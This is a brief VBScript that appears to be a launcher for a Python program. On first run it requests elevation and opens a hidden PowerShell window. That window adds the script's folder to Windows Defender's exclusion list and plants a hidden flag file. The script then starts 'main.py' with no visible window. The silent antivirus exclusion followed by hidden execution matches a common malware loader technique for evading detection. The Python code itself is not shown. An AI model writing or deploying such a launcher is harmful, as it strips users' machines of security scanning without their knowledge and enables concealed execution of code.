Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")


strCurrentDir = WshShell.CurrentDirectory

strFlagFile = strCurrentDir & "\.exclusion_added"


If Not objFSO.FileExists(strFlagFile) Then
    Set objShell = CreateObject("Shell.Application")

    strPSCommand = "$p = '" & strCurrentDir & "'; " & _
                   "Add-MpPreference -ExclusionPath $p; " & _
                   "New-Item -Path $p -Name '.exclusion_added' -ItemType 'file' -Force | Out-Null; " & _
                   "(Get-Item $p\.exclusion_added).Attributes = 'Hidden'"
                   
       objShell.ShellExecute "powershell", "-Command " & strPSCommand, "", "runas", 0
    
  
    WScript.Sleep 1500
End If

WshShell.Run "cmd /c .venv\Scripts\python.exe main.py", 0